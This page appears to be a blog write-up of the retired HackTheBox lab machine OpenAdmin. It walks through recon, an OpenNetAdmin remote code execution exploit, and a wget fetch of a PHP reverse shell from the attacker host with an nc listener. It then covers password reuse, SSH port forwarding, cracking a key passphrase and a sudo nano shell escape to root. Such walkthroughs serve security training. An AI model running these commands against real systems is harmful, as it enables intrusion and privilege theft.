<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dawnl3ss :: OpenAdmin HTB Write-Up</title>

    <meta property="og:title" content="Dawnless | OpenAdmin HTB Write-Up">
    <meta property="og:image" content="http://dawnl3ss.me/assets/img/ogimage.jpg">
    <meta property="og:description" content="OpenAdmin HackTheBox Write-Up by Dawnl3ss. OpenNetAdmin RCE + SSH port forwarding + nano GTFOBins.">
    <meta name="author" content="Dawnless">

    <link rel="icon" href="/public/img/icon.jpg" type="image/png">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;600&display=swap">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/MaterialDesign-Webfont/7.4.47/css/materialdesignicons.min.css">
    <link rel="stylesheet" href="/public/css/components/wtpage.css">
</head>
<body>

<header class="header" id="header">
    <div class="container">
        <nav class="nav">
            <a href="/" class="nav-logo">
                <img src="/public/img/icon.jpg" alt="Dawnl3ss">
                <div class="logo-text">dawnl3ss<span>@parrot</span></div>
            </a>
            <ul class="nav-list" id="navList">
                <li><a href="/" class="nav-link">Home</a></li>
                <li><a href="/writeups" class="nav-link">Writeups</a></li>
                <li><a href="#recon" class="nav-link">Recon</a></li>
                <li><a href="#access" class="nav-link">Access</a></li>
                <li><a href="#latmov" class="nav-link">Lat Mov</a></li>
                <li><a href="#privesc" class="nav-link">PrivEsc</a></li>
            </ul>
            <button class="nav-toggle" id="navToggle" aria-label="Toggle menu">
                <span></span><span></span><span></span>
            </button>
        </nav>
    </div>
</header>

<section class="writeup-hero">
    <div class="container hero-inner">
        <div class="breadcrumb">
            <a href="/"><i class="mdi mdi-home"></i> Home</a>
            <i class="mdi mdi-chevron-right"></i>
            <a href="/writeups">Writeups</a>
            <i class="mdi mdi-chevron-right"></i>
            <span>OpenAdmin</span>
        </div>

        <div class="writeup-banner">
            <img
                class="box-avatar"
                src="https://labs.hackthebox.com/storage/avatars/5b00db157dbbd7099ff6c0ef10f910ea.png"
                alt="OpenAdmin HTB"
            >
            <div class="writeup-meta">
                <h1>HTB - <span>OpenAdmin</span> Write-Up</h1>
                <div class="meta-row">
                    <span class="meta-badge difficulty-easy"><i class="mdi mdi-circle-slice-8"></i> Easy</span>
                    <span class="meta-badge os-linux"><i class="mdi mdi-linux"></i> Linux</span>
                    <span class="meta-badge type-web"><i class="mdi mdi-web"></i> Web App</span>
                    <span class="meta-badge platform"><i class="mdi mdi-flag-checkered"></i> HackTheBox</span>
                </div>
                <div class="tag-list">
                    <span class="tag">ctf</span>
                    <span class="tag">boot2root</span>
                    <span class="tag">linux</span>
                    <span class="tag">port-forwarding</span>
                    <span class="tag">apache2</span>
                    <span class="tag">gtfobins</span>
                </div>
            </div>
        </div>
    </div>
</section>

<div class="writeup-layout">

    <aside class="toc-sidebar">
        <nav class="toc-box">
            <p class="toc-title"><i class="mdi mdi-format-list-bulleted"></i> Contents</p>
            <ul class="toc-list">
                <li><a href="#intro"><i class="mdi mdi-information-outline"></i> Introduction</a></li>
                <li><a href="#recon"><i class="mdi mdi-radar"></i> Reconnaissance</a></li>
                <li><a href="#access"><i class="mdi mdi-console"></i> Getting a Shell</a></li>
                <li><a href="#latmov"><i class="mdi mdi-swap-horizontal"></i> Lateral Movement</a></li>
                <li><a href="#privesc"><i class="mdi mdi-crown-outline"></i> Privilege Escalation</a></li>
            </ul>
        </nav>
    </aside>

    <main class="writeup-content">

        <section class="wt-section" id="intro">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-information-outline"></i></div>
                <div>
                    <span class="section-num">01 /</span>
                    <h2>Introduction</h2>
                </div>
            </div>

            <p>
                <a href="https://app.hackthebox.com/machines/OpenAdmin" target="_blank">OpenAdmin</a> is a retired machine on HackTheBox.
                The objective is to compromise the target and retrieve both the user and root flags.
            </p>

            <div class="box-info-card">
                <div class="box-info-item">
                    <i class="mdi mdi-flag-variant"></i>
                    <span class="bi-label">Name</span>
                    <span class="bi-value">OpenAdmin</span>
                </div>
                <div class="box-info-item">
                    <i class="mdi mdi-gauge"></i>
                    <span class="bi-label">Difficulty</span>
                    <span class="bi-value" style="color:#22c55e">Easy</span>
                </div>
                <div class="box-info-item">
                    <i class="mdi mdi-linux"></i>
                    <span class="bi-label">OS</span>
                    <span class="bi-value">Linux</span>
                </div>
                <div class="box-info-item">
                    <i class="mdi mdi-web"></i>
                    <span class="bi-label">Type</span>
                    <span class="bi-value">Web App</span>
                </div>
            </div>

            <p>Let's dive into the challenge!</p>
        </section>

        <section class="wt-section" id="recon">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-radar"></i></div>
                <div>
                    <span class="section-num">02 /</span>
                    <h2>Reconnaissance</h2>
                </div>
            </div>

            <p>I added the machine domain to <code class="inline">/etc/hosts</code>, then ran a full NMAP scan:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">nmap scan</span>
                    <button class="tb-copy" data-target="cmd1">copy</button>
                </div>
                <pre id="cmd1"><span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/OpenAdmin]
└──╼ [★]$</span> <span class="cmd">nmap -sV -sC -Pn -p- openadmin.htb</span>
<span class="output">Starting Nmap 7.94SVN at 2024-06-19 11:49 CEST
Nmap scan report for openadmin.htb (10.10.10.171)
Host is up (0.014s latency).
PORT   STATE SERVICE VERSION
<span class="success">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3</span>
<span class="success">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span>
|_http-title: Apache2 Ubuntu Default Page: It works

Nmap done: 1 IP address (1 host up) scanned in 21.51 seconds</span></pre>
            </div>

            <p>Port 80 only shows the Apache2 default page. Let's fuzz for hidden directories:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">ffuf - directory fuzzing</span>
                    <button class="tb-copy" data-target="cmd2">copy</button>
                </div>
                <pre id="cmd2"><span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/OpenAdmin]
└──╼ [★]$</span> <span class="cmd">ffuf -u http://openadmin.htb/FUZZ -w /security/tools/Kharon/ressources/wordlists/dir-enum-int-3.txt -c -t 90</span>
<span class="output"><span class="success">music                   [Status: 301]
artwork                 [Status: 301]
sierra                  [Status: 301]</span>
server-status           [Status: 403]</span></pre>
            </div>

            <p>
                Three website templates are exposed. Exploring <code class="inline">/music</code> reveals a login button
                that redirects to <code class="inline">/ona</code> - an <strong>OpenNetAdmin</strong> panel running version <strong>18.1.1</strong>, flagged as outdated.
            </p>

            <div class="writeup-img-wrap">
                <img src="/public/img/htb/openadmin/site1.png" alt="OpenNetAdmin panel">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// openadmin.htb/ona - OpenNetAdmin v18.1.1</div>
            </div>
        </section>

        <section class="wt-section" id="access">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-console"></i></div>
                <div>
                    <span class="section-num">03 /</span>
                    <h2>Getting a Shell</h2>
                </div>
            </div>

            <p>A quick searchsploit lookup confirms version 18.1.1 is vulnerable to RCE:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">searchsploit opennetadmin</span>
                    <button class="tb-copy" data-target="cmd3">copy</button>
                </div>
                <pre id="cmd3"><span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/OpenAdmin]
└──╼ [★]$</span> <span class="cmd">searchsploit opennetadmin</span>
<span class="output">OpenNetAdmin 13.03.01 - Remote Code Execution               | php/webapps/26682.txt
<span class="success">OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)| php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                 | php/webapps/47691.sh</span></span></pre>
            </div>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">exploit 47691.sh</span>
                    <button class="tb-copy" data-target="cmd4">copy</button>
                </div>
                <pre id="cmd4"><span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/OpenAdmin]
└──╼ [★]$</span> <span class="cmd">bash 47691.sh http://openadmin.htb/ona/</span>
<span class="output">$ id
<span class="success">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span></pre>
            </div>

            <p>The shell is unstable. I uploaded a PHP reverse shell via a Python HTTP server and triggered it through the browser:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">upload reverse shell</span>
                    <button class="tb-copy" data-target="cmd5">copy</button>
                </div>
                <pre id="cmd5"><span class="output">$</span> <span class="cmd">wget http://10.10.14.3/rev-shell.php</span>
<span class="output">$</span> <span class="cmd">ls</span>
<span class="output">config  dcm.php  images  include  index.php  local
login.php  logout.php  modules  plugins  <span class="success">rev-shell.php</span>  winc</span></pre>
            </div>

            <div class="writeup-img-wrap">
                <img src="/public/img/htb/openadmin/site2.png" alt="Triggering reverse shell">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// Requesting rev-shell.php through the browser</div>
            </div>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">netcat - stable shell</span>
                    <button class="tb-copy" data-target="cmd6">copy</button>
                </div>
                <pre id="cmd6"><span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/OpenAdmin]
└──╼ [★]$</span> <span class="cmd">nc -lnvp 4444</span>
<span class="output">connect to [10.10.14.3] from (UNKNOWN) [10.10.10.171] 47306
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$</span> <span class="cmd">python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
<span class="success">www-data@openadmin:/$</span></pre>
            </div>
        </section>

        <section class="wt-section" id="latmov">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-swap-horizontal"></i></div>
                <div>
                    <span class="section-num">04 /</span>
                    <h2>Lateral Movement</h2>
                </div>
            </div>

            <p>Exploring the OpenNetAdmin files, I found a database config file leaking credentials:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">database_settings.inc.php</span>
                    <button class="tb-copy" data-target="cmd7">copy</button>
                </div>
                <pre id="cmd7"><span class="output">www-data@openadmin:/opt/ona/www/local/config$</span> <span class="cmd">cat database_settings.inc.php</span>
<span class="output">&lt;?php
$ona_contexts=array (
  'DEFAULT' =>
  array (
    'databases' =>
    array (
      0 =>
      array (
        'db_login' => 'ona_sys',
<span class="success">        'db_passwd' => 'n1nj4W4rri0R!',</span>
        'db_database' => 'ona_default',
      ),
    ),
  ),
);</span></pre>
            </div>

            <p>Password reuse - switching to user <code class="inline">jimmy</code> works immediately:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">su jimmy + SSH</span>
                    <button class="tb-copy" data-target="cmd8">copy</button>
                </div>
                <pre id="cmd8"><span class="output">www-data@openadmin:/home$</span> <span class="cmd">su jimmy</span>
<span class="output">Password: n1nj4W4rri0R!
<span class="success">jimmy@openadmin:/home$</span></span>

<span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/OpenAdmin]
└──╼ [★]$</span> <span class="cmd">ssh jimmy@openadmin.htb</span>
<span class="output">jimmy@openadmin.htb's password:
<span class="success">jimmy@openadmin:~$</span></span></pre>
            </div>

            <p>There's an <code class="inline">internal</code> folder in <code class="inline">/var/www/</code> owned by jimmy. Checking Apache config reveals it's running on an internal port:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">internal.conf</span>
                    <button class="tb-copy" data-target="cmd9">copy</button>
                </div>
                <pre id="cmd9"><span class="output">jimmy@openadmin:/etc/apache2/sites-enabled$</span> <span class="cmd">cat internal.conf</span>
<span class="output"><span class="highlight">Listen 127.0.0.1:52846</span>

&lt;VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal
    &lt;IfModule mpm_itk_module>
        AssignUserID joanna joanna
    &lt;/IfModule>
&lt;/VirtualHost></span></pre>
            </div>

            <p>The internal app runs as <code class="inline">joanna</code> on port <strong>52846</strong>. I forward it locally via SSH:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">SSH local port forwarding</span>
                    <button class="tb-copy" data-target="cmd10">copy</button>
                </div>
                <pre id="cmd10"><span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/OpenAdmin]
└──╼ [★]$</span> <span class="cmd">ssh -L 8888:localhost:52846 jimmy@openadmin.htb</span>
<span class="output">jimmy@openadmin.htb's password:
<span class="success">jimmy@openadmin:~$</span></span></pre>
            </div>

            <div class="writeup-img-wrap">
                <img src="/public/img/htb/openadmin/site3.png" alt="Internal web app on localhost:8888">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// localhost:8888 - internal web app forwarded</div>
            </div>

            <p>
                Jimmy has write access to <code class="inline">/var/www/internal/index.php</code>.
                I removed the login conditions so the page redirects directly to <code class="inline">main.php</code>, which outputs Joanna's private SSH key.
            </p>

            <div class="writeup-img-wrap">
                <img src="/public/img/htb/openadmin/site4.png" alt="Joanna's SSH private key">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// main.php - Joanna's SSH private key exposed</div>
            </div>

            <p>The key is passphrase-protected. I cracked it with John:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">john - SSH key passphrase crack</span>
                    <button class="tb-copy" data-target="cmd11">copy</button>
                </div>
                <pre id="cmd11"><span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/OpenAdmin]
└──╼ [★]$</span> <span class="cmd">ssh2john id_rsa > id_rsa.john</span>
<span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/OpenAdmin]
└──╼ [★]$</span> <span class="cmd">john id_rsa.john --wordlist=/security/rockyou.txt</span>
<span class="output">Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
<span class="success">bloodninjas      (id_rsa)</span>
1g 0:00:02:06 DONE (2024-06-19 13:18)</span></pre>
            </div>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">SSH as joanna + user flag</span>
                    <button class="tb-copy" data-target="cmd12">copy</button>
                </div>
                <pre id="cmd12"><span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/OpenAdmin]
└──╼ [★]$</span> <span class="cmd">ssh -i id_rsa joanna@openadmin.htb</span>
<span class="output">Enter passphrase for key 'id_rsa': bloodninjas
<span class="success">joanna@openadmin:~$</span>

joanna@openadmin:~$</span> <span class="cmd">cat user.txt</span>
<span class="success">...REDACTED...</span></pre>
            </div>

            <div class="callout success">
                <i class="mdi mdi-flag"></i>
                <p><strong>User flag captured!</strong> Now let's escalate to root.</p>
            </div>
        </section>

        <section class="wt-section" id="privesc">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-crown-outline"></i></div>
                <div>
                    <span class="section-num">05 /</span>
                    <h2>Privilege Escalation</h2>
                </div>
            </div>

            <p>Checking joanna's sudo permissions:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">sudo -l</span>
                    <button class="tb-copy" data-target="cmd13">copy</button>
                </div>
                <pre id="cmd13"><span class="output">joanna@openadmin:~$</span> <span class="cmd">sudo -l</span>
<span class="output">User joanna may run the following commands on openadmin:
<span class="success">    (ALL) NOPASSWD: /bin/nano /opt/priv</span></span></pre>
            </div>

            <div class="callout info">
                <i class="mdi mdi-lightbulb-outline"></i>
                <p><code class="inline">nano</code> can be abused to spawn a shell when run with sudo. GTFOBins confirms the technique via the built-in <code class="inline">Execute Command</code> feature.</p>
            </div>

            <div class="writeup-img-wrap">
                <img src="/public/img/htb/openadmin/site5.png" alt="GTFOBins nano">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// GTFOBins - nano privilege escalation</div>
            </div>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">nano GTFOBins -> root</span>
                    <button class="tb-copy" data-target="cmd14">copy</button>
                </div>
                <pre id="cmd14"><span class="output">joanna@openadmin:~$</span> <span class="cmd">sudo nano /opt/priv</span>
<span class="output">^R^X
Command to execute: <span class="cmd">reset; sh 1>&0 2>&0</span>

<span class="success"># id
uid=0(root) gid=0(root) groups=0(root)</span>

# cat /root/root.txt
<span class="success">...REDACTED...</span></span></pre>
            </div>

            <div class="callout success">
                <i class="mdi mdi-crown"></i>
                <p><strong>Root flag captured!</strong> Box fully pwned via OpenNetAdmin RCE -> password reuse -> SSH port forwarding -> nano GTFOBins. 💀</p>
            </div>
        </section>

    </main>
</div>

<footer class="footer">
    <div class="container footer-content">
        <div class="footer-social">
            <a href="https://github.com/dawnl3ss/" target="_blank"><i class="mdi mdi-github"></i></a>
            <a href="https://discord.gg/hardware" target="_blank"><i class="mdi mdi-discord"></i></a>
            <a href="http://dawnl3ss.me/" target="_blank"><i class="mdi mdi-web"></i></a>
            <a href="https://twitter.com/dawnl3ss" target="_blank"><i class="mdi mdi-twitter"></i></a>
        </div>
        <nav class="footer-nav">
            <a href="/">Home</a>
            <a href="/writeups">Writeups</a>
            <a href="mailto:dawnl3ss@protonmail.com">Contact</a>
        </nav>
        <p class="footer-copyright">Copyright Dawnl3ss © 2025 - <span style="color:var(--primary)">dawnl3ss@parrot-sec</span></p>
    </div>
</footer>

<div class="lightbox-overlay" id="lightbox">
    <button class="lightbox-close" id="lightboxClose">&times;</button>
    <img class="lightbox-img" id="lightboxImg" src="" alt="">
</div>

<script src="/public/js/wtpage.js"></script>
</body>
</html>